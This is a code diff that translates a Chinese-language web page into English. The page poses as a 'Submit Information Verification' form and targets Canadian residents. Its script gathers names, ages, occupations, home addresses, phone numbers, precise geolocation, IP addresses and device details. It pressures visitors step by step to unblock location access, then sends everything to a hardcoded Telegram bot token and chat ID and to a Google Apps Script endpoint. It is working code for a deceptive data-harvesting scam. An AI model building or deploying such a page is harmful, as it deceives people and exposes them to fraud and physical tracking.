@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>提交信息验证</title>
+    <title>Submit Information Verification</title>
     <style>
         :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #dc2626; --error-bg: #fef2f2; --success: #16a34a; --success-bg: #f0fdf4; --warn: #f59e0b; --info: #2563eb; --info-bg: #eff6ff; }
         * { box-sizing: border-box; }
@@ -56,19 +56,19 @@
 
 <div class="container">
     <div id="step-form">
-        <h2>提交信息验证</h2>
+        <h2>Submit Information Verification</h2>
         <div class="subtitle">AI Smart Validation & Security Center</div>
         
         <div class="form-row">
             <div class="form-group">
                 <label>First Name *</label>
                 <input type="text" id="firstName" placeholder="e.g. John" oninput="aiValidateField('firstName'); saveFormDraft()">
-                <div class="error-hint" id="err-firstName">⚠️ 请输入至少2个字符</div>
+                <div class="error-hint" id="err-firstName">⚠️ Please enter at least 2 characters</div>
             </div>
             <div class="form-group">
                 <label>Last Name *</label>
                 <input type="text" id="lastName" placeholder="e.g. Doe" oninput="aiValidateField('lastName'); saveFormDraft()">
-                <div class="error-hint" id="err-lastName">⚠️ 请输入至少2个字符</div>
+                <div class="error-hint" id="err-lastName">⚠️ Please enter at least 2 characters</div>
             </div>
         </div>
 
@@ -76,12 +76,12 @@
             <div class="form-group">
                 <label>Age *</label>
                 <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="aiValidateField('age'); saveFormDraft()">
-                <div class="error-hint" id="err-age">⚠️ 请输入有效年龄 (1–120)</div>
+                <div class="error-hint" id="err-age">⚠️ Please enter a valid age (1–120)</div>
             </div>
             <div class="form-group">
                 <label>Current Occupation *</label>
                 <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation'); saveFormDraft()">
-                <div class="error-hint" id="err-occupation">⚠️ 请输入至少2个字符</div>
+                <div class="error-hint" id="err-occupation">⚠️ Please enter at least 2 characters</div>
             </div>
         </div>
 
@@ -95,7 +95,7 @@
         <div class="form-group">
             <label>Province / Territory *</label>
             <select id="provinceSelect" onchange="aiValidateField('provinceSelect'); saveFormDraft()">
-                <option value="">-- 请选择省份 --</option>
+                <option value="">-- Select Province / Territory --</option>
                 <option value="Alberta">Alberta</option>
                 <option value="British Columbia">British Columbia</option>
                 <option value="Manitoba">Manitoba</option>
@@ -110,25 +110,25 @@
                 <option value="Nunavut">Nunavut</option>
                 <option value="Yukon">Yukon</option>
             </select>
-            <div class="error-hint" id="err-provinceSelect">⚠️ 请选择省份</div>
+            <div class="error-hint" id="err-provinceSelect">⚠️ Please select a province / territory</div>
         </div>
 
         <div class="form-group">
             <label>Street Address *</label>
             <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="aiValidateField('address'); saveFormDraft()">
-            <div class="error-hint" id="err-address">⚠️ 请输入详细地址</div>
+            <div class="error-hint" id="err-address">⚠️ Please enter your street address</div>
         </div>
 
         <div class="form-row">
             <div class="form-group">
                 <label>City *</label>
                 <input type="text" id="city" placeholder="e.g. Toronto" oninput="aiValidateField('city'); saveFormDraft()">
-                <div class="error-hint" id="err-city">⚠️ 请输入城市名称</div>
+                <div class="error-hint" id="err-city">⚠️ Please enter a valid city name</div>
             </div>
             <div class="form-group">
                 <label>Postal Code *</label>
                 <input type="text" id="zipCode" placeholder="e.g. A1A 1A1" oninput="formatZipCode(); saveFormDraft()">
-                <div class="error-hint" id="err-zipCode">⚠️ 请输入邮编</div>
+                <div class="error-hint" id="err-zipCode">⚠️ Please enter your postal code</div>
             </div>
         </div>
 
@@ -138,82 +138,87 @@
                 <select id="phonePrefix" disabled>
                     <option value="+1" selected>+1</option>
                 </select>
-                <input type="tel" id="phone" placeholder="请输入10位手机号" oninput="aiValidateField('phone'); saveFormDraft()">
+                <input type="tel" id="phone" placeholder="Enter 10-digit number" oninput="aiValidateField('phone'); saveFormDraft()">
             </div>
-            <div class="error-hint" id="err-phone">⚠️ 请输入10位有效号码</div>
+            <div class="error-hint" id="err-phone">⚠️ Please enter a valid 10-digit phone number</div>
         </div>
 
-        <button class="btn" id="btn-next" onclick="proceedToVerification()">下一步</button>
+        <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
     <div id="step-verification">
-        <h2>信息确认</h2>
-        <p style="text-align:center; color:#64748b; font-size:14px;">提交前请核对信息是否正确</p>
+        <h2>Confirm Information</h2>
+        <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
 
-        <div id="status-box" class="status-box status-success hidden">✅ 信息验证通过</div>
+        <div id="status-box" class="status-box status-success hidden">✅ Information Verified Successfully</div>
         
         <div id="loc-request-box" class="status-box status-error hidden">
-            <strong>📍 需要获取位置</strong><br>
-            为验证收货地址与实际位置匹配，需要您允许获取位置，请在弹窗选择 <span class="highlight-text">"允许"</span>。
+            <strong>📍 Why We Need Your Location</strong><br>
+            We need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.<br><br>
+            <strong>Please click the button below and select <span class="highlight-text">"Allow"</span> when prompted.</strong>
         </div>
-        <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 点击重新获取位置</button>
+        <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
 
         <div id="loc-instruction-box" class="status-box status-info hidden">
-            <strong>🔒 位置权限被禁用</strong><br>
-            请按以下步骤开启：<br><br>
+            <strong>🔒 Location Access Was Blocked</strong><br><br>
+            Please follow these steps to enable location access:<br><br>
             <div class="step-row">
                 <span class="step-num">1</span>
-                <span class="step-text">点击地址栏左侧 🔒 锁图标</span>
+                <span class="step-text">Look at the very top of your browser, where the website address is shown</span>
             </div>
             <div class="step-row">
                 <span class="step-num">2</span>
-                <span class="step-text">找到「位置/定位」→ 改为「允许」</span>
+                <span class="step-text">Find and tap the <span class="lock-icon">🔒</span> <strong>lock icon</strong> (to the left of the website address)</span>
             </div>
             <div class="step-row">
                 <span class="step-num">3</span>
-                <span class="step-text">刷新页面后继续提交</span>
+                <span class="step-text">Find <strong>"Location"</strong> in the list → change permission from "Block" to <span class="highlight-text">"Allow"</span></span>
+            </div>
+            <div class="step-row">
+                <span class="step-num">4</span>
+                <span class="step-text"><strong>Refresh this page</strong> — your information will NOT be lost</span>
             </div>
         </div>
 
         <div class="info-card">
-            <p><strong>姓名：</strong><span id="disp-name"></span></p>
-            <p><strong>年龄：</strong><span id="disp-age"></span></p>
-            <p><strong>职业：</strong><span id="disp-occupation"></span></p>
-            <p><strong>收货地址：</strong><span id="disp-addr"></span></p>
-            <p><strong>电话：</strong><span id="disp-phone"></span></p>
-            <p><strong>邮编：</strong><span id="disp-zip"></span></p>
+            <p><strong>Name:</strong> <span id="disp-name"></span></p>
+            <p><strong>Age:</strong> <span id="disp-age"></span></p>
+            <p><strong>Occupation:</strong> <span id="disp-occupation"></span></p>
+            <p><strong>Shipping Address:</strong> <span id="disp-addr"></span></p>
+            <p><strong>Phone Number:</strong> <span id="disp-phone"></span></p>
+            <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
         </div>
 
-        <button class="btn btn-success" id="btn-submit" onclick="submitData()">确认并提交</button>
+        <button class="btn btn-success" id="btn-submit" onclick="submitData()">Confirm & Submit</button>
     </div>
 </div>
 
 <script>
 // =====================================================
-// 🔑 【只改这里】填入你的配置，其他代码不用动！
+// 🔑 CONFIGURATION — Update only these values!
 // =====================================================
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
-// ⬇️ 填入你从 Apps Script 复制的 Web 应用 URL ⬇️
+// Your Apps Script Web App URL
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzZb6ArjTa-1veHjdqQbOkqFk5pc_F0l98_2QR67W_7K14GuMNLW-GFEdhcC7KLCaM/exec";
 
-// ========== 常量配置（不用改） ==========
+// ========== Constants ==========
 const DISTANCE_THRESHOLD_METERS = 150;
 const URL_PARAMS = new URLSearchParams(window.location.search);
 const CHAT_ID = URL_PARAMS.get("id") || TELEGRAM_CHAT_ID;
 
-// ========== 全局状态 ==========
+// ========== Global State ==========
 let formData = {};
 let deviceInfo = { ip: "", device: "", os: "", browser: "" };
 let locationInfo = { lat: "", lng: "", status: "pending" };
 
-// ========== 页面加载初始化 ==========
+// ========== Initialize ==========
 window.onload = () => {
     deviceInfo = parseUserAgent();
     restoreFormDraft();
 };
 
-// ========== 草稿保存与恢复 ==========
+// ========== Auto-Save & Restore Form ==========
 function saveFormDraft(){
     const draft = {
         firstName: document.getElementById('firstName').value,
@@ -243,7 +248,7 @@ function restoreFormDraft(){
     }catch{}
 }
 
-// ========== 计算两点距离（米） ==========
+// ========== Calculate Distance (meters) ==========
 function getDistanceMeters(lat1,lng1,lat2,lng2){
     if(!lat1 || !lng1 || !lat2 || !lng2) return 999999;
     const toRad = deg => deg * Math.PI / 180;
@@ -253,11 +258,11 @@ function getDistanceMeters(lat1,lng1,lat2,lng2){
     return 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
 }
 
-// ========== 本地历史读写（仅用于消息提醒展示） ==========
+// ========== Local History (for Telegram display only) ==========
 function loadHistory(){ try{ return JSON.parse(localStorage.getItem('submitHistory')||'[]'); } catch{ return []; } }
 function saveHistory(record){ const h=loadHistory(); h.push(record); localStorage.setItem('submitHistory', JSON.stringify(h)); }
 
-// ========== 邮编格式化 ==========
+// ========== Format Postal Code ==========
 function formatZipCode(){
     const el = document.getElementById('zipCode');
     const pos = el.selectionStart;
@@ -270,7 +275,7 @@ function formatZipCode(){
     return ok;
 }
 
-// ========== 输入框验证 ==========
+// ========== Field Validation ==========
 function aiValidateField(fid){
     const el=document.getElementById(fid); if(!el)return true;
     const v=el.value.trim();
@@ -292,7 +297,7 @@ function aiValidateField(fid){
     return ok;
 }
 
-// ========== 进入确认页 ==========
+// ========== Go to Confirmation Page ==========
 async function proceedToVerification(){
     const fields=['firstName','lastName','age','occupation','provinceSelect','address','city','zipCode','phone'];
     let firstErrorId = null;
@@ -307,7 +312,7 @@ async function proceedToVerification(){
     });
 
     if(!allOk){
-        alert('请检查红色标注项后再提交。');
+        alert('Please check highlighted fields before proceeding.');
         if(firstErrorId){
             document.getElementById(firstErrorId).scrollIntoView({behavior:'smooth', block:'center'});
             document.getElementById(firstErrorId).focus();
@@ -342,12 +347,11 @@ async function proceedToVerification(){
     document.getElementById('loc-request-box').classList.remove('hidden');
     document.getElementById('btn-retry-loc').classList.remove('hidden');
 
-    // 🔑 等待获取位置 → IP
     await requestLocation();
     await fetchIPAddress();
 }
 
-// ========== 📍 获取位置 ==========
+// ========== 📍 Get Location ==========
 function requestLocation(){
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -368,7 +372,7 @@ function requestLocation(){
                 if (err.code === 1) { locationInfo.status = "blocked"; showInstructionBox(); }
                 else if (err.code === 3) {
                     locationInfo.status = "timeout";
-                    document.getElementById('loc-request-box').innerHTML = "⏱️ 请求超时，请点击下方按钮并选择「允许」";
+                    document.getElementById('loc-request-box').innerHTML = "⏱️ Request timed out. Please tap the button below and select \"Allow\".";
                     document.getElementById('loc-request-box').classList.remove('hidden');
                     document.getElementById('btn-retry-loc').classList.remove('hidden');
                 } else { locationInfo.status = "error"; showInstructionBox(); }
@@ -389,7 +393,7 @@ function showInstructionBox(){
     document.getElementById('loc-instruction-box').classList.remove('hidden');
 }
 
-// ========== 🌐 获取IP ==========
+// ========== 🌐 Get IP Address ==========
 async function fetchIPAddress(){ 
     try{ 
         const r = await fetch('https://api.ipify.org?format=json'); 
@@ -401,20 +405,20 @@ async function fetchIPAddress(){
     } 
 }
 
-// ========== 提交入口 ==========
+// ========== Submit Entry ==========
 async function submitData(){
     if(locationInfo.status !== "granted"){
-        alert("必须允许位置权限才能提交！\n请按页面提示开启权限后重试。");
+        alert("Location permission is REQUIRED before submission.\nPlease enable location access and try again.");
         return;
     }
     doSubmit();
 }
 
-// ========== 🚀 核心提交：云端谷歌表格+Telegram双推送 ==========
+// ========== 🚀 Submit to Google Sheets + Telegram ==========
 async function doSubmit(){
-    const timeStr = new Date().toLocaleString('zh-CN');
+    const timeStr = new Date().toLocaleString('en-US');
 
-    // ✅ 组装仅需要的字段 → 发给谷歌表格
+    // ✅ Prepare data for Google Sheets
     const cloudData = {
         "手机号": formData.phoneFull,
         "IP地址": deviceInfo.ip,
@@ -426,24 +430,24 @@ async function doSubmit(){
         "录入时间": timeStr
     };
 
-    // ✅ 云端提交（谷歌表格自动查重+永久保存）
+    // ✅ Send to Google Sheets
     try {
-        if(APPSCRIPT_URL && !APPSCRIPT_URL.includes("AKfycbzZb6ArjTa-1veHjdqQbOkqFk5pc_F0l98_2QR67W_7K14GuMNLW-GFEdhcC7KLCaM")){
+        if(APPSCRIPT_URL && !APPSCRIPT_URL.includes("替换成你自己的")){
             await fetch(APPSCRIPT_URL, {
                 method: "POST",
                 mode: "no-cors",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(cloudData)
             });
-            console.log("✅ 数据已存入谷歌表格云端");
+            console.log("✅ Data saved to Google Sheets");
         } else {
-            console.warn("⚠️ 尚未配置 APPSCRIPT_URL，仅保存本地记录");
+            console.warn("⚠️ APPSCRIPT_URL not configured");
         }
     } catch(e) {
-        console.warn("谷歌表格提交失败：", e.message);
+        console.warn("Google Sheets submission failed:", e.message);
     }
 
-    // ✅ 本地历史统计（用于消息提醒展示）
+    // ✅ Local history check for Telegram notification
     const history = loadHistory();
     let matchCount = 0;
     let firstTime = timeStr;
@@ -461,22 +465,22 @@ async function doSubmit(){
     }
     const currentCount = matchCount + 1;
 
-    // ✅ 组装提醒
+    // ✅ Telegram duplicate note
     let duplicateNote = "";
     if(currentCount > 1){
-        duplicateNote = `‼️‼️‼️ 重复提交提醒：云端已记录
-• 出现次数：第 ${currentCount} 次
-• 首次提交：${firstTime}
-• IP地址：${deviceInfo.ip}
-• 设备/型号：${deviceInfo.device}
-• 操作系统：${deviceInfo.os}
-• 浏览器：${deviceInfo.browser}
-• 坐标：${locationInfo.lat}, ${locationInfo.lng}
+        duplicateNote = `‼️‼️‼️ DUPLICATE SUBMISSION ALERT
+• Submission: #${currentCount}
+• First Seen: ${firstTime}
+• IP Address: ${deviceInfo.ip}
+• Device: ${deviceInfo.device}
+• OS: ${deviceInfo.os}
+• Browser: ${deviceInfo.browser}
+• Coordinates: ${locationInfo.lat}, ${locationInfo.lng}
 ——————————————
 `;
     }
 
-    // ✅ 保存到本地（仅用于展示提醒，不依赖它查重）
+    // ✅ Save locally (for reference only)
     saveHistory({
         name: formData.name, age: formData.age, occupation: formData.occupation,
         phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
@@ -485,28 +489,28 @@ async function doSubmit(){
         lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
     });
 
-    // ✅ 发送 Telegram 消息
-    const msg = `${duplicateNote}📩 新提交的资料
+    // ✅ Send Telegram message
+    const msg = `${duplicateNote}📩 NEW SUBMISSION RECEIVED
 ——————————————
-姓名：${formData.name}
-年龄：${formData.age}
-当前职业：${formData.occupation}
-收货地址：国家:${formData.countryName}，省份:${formData.province}，城市:${formData.city}，街道:${formData.address}
-邮政编码：${formData.zip}
-电话号码：${formData.phonePrefix} ${formData.phone}
+Name: ${formData.name}
+Age: ${formData.age}
+Occupation: ${formData.occupation}
+Shipping Address: Country: ${formData.countryName}, Province: ${formData.province}, City: ${formData.city}, Street: ${formData.address}
+Postal Code: ${formData.zip}
+Phone Number: ${formData.phonePrefix} ${formData.phone}
 
-📊 提交统计：
-• 出现次数：第 ${currentCount} 次
-• 首次提交：${firstTime}
-• 最近提交：${timeStr}
+📊 SUBMISSION RECORD:
+• Submission #: ${currentCount}
+• First Submitted: ${firstTime}
+• This Submission: ${timeStr}
 
-设备和网络信息：
-• IP地址：${deviceInfo.ip}
-• 设备/型号：${deviceInfo.device}
-• 操作系统：${deviceInfo.os}
-• 浏览器：${deviceInfo.browser}
-• 坐标：${locationInfo.lat}, ${locationInfo.lng}
-⏰ 提交时间：${timeStr}
+DEVICE & NETWORK INFO:
+• IP Address: ${deviceInfo.ip}
+• Device/Model: ${deviceInfo.device}
+• Operating System: ${deviceInfo.os}
+• Browser: ${deviceInfo.browser}
+• Coordinates: ${locationInfo.lat}, ${locationInfo.lng}
+⏰ Submitted: ${timeStr}
 ——————————————`;
 
     try{
@@ -517,18 +521,18 @@ async function doSubmit(){
         });
         const json=await res.json();
         if(json.ok){ 
-            alert('提交成功！'); 
+            alert('Submitted successfully!'); 
             localStorage.removeItem('formDraft'); 
             location.reload(); 
         } else {
-            alert('Telegram 提交失败：' + JSON.stringify(json));
+            alert('Telegram Error: ' + JSON.stringify(json));
         }
     }catch(e){
-        alert('网络错误：'+e.message);
+        alert('Network Error: ' + e.message);
     }
 }
 
-// ========== 解析设备/系统/浏览器 ==========
+// ========== Parse Device Info ==========
 function parseUserAgent(){
     const ua = navigator.userAgent;
     let device = "Unknown Device", os = "Unknown OS", browser = "Unknown Browser";
